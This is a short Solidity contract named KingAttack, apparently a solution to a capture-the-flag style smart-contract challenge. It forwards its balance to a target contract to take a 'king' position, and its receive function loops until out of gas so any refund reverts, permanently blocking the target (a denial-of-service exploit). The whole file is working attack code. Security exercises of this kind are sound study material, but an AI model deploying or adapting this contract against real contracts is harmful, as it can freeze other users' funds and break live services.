// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    constructor() public payable {}

    receive() external payable {
        for (uint256 i = 1; i > 0; i++) {}
    }

    function claimKing(address payable destination) external {
        destination.call.value(address(this).balance)("");
    }
}
